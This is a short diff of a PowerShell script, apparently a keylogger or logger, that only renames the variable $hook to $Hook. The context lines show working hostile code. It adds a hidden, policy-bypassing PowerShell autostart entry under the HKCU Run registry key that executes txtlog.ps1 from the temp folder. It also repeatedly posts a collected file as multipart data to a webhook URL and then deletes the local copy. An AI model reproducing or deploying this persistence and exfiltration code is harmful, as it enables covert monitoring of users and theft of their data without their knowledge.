@@ -1,5 +1,5 @@
 if(($Persistent -eq $true)){
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$hook=' + $hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
 }else{
     Remove-Item "$env:temp\txtlog.ps1" -Force;
@@ -80,7 +80,7 @@ Do{
                     "--$boundary--$LF"
                 ) -join $LF;
 
-                Invoke-WebRequest -Uri $hook -ContentType ("multipart/form-data; boundary=$boundary") -Method Post -Body $body;
+                Invoke-WebRequest -Uri $Hook -ContentType ("multipart/form-data; boundary=$boundary") -Method Post -Body $body;
                 Remove-Item -Path $Path -force;
             }
         }finally{}
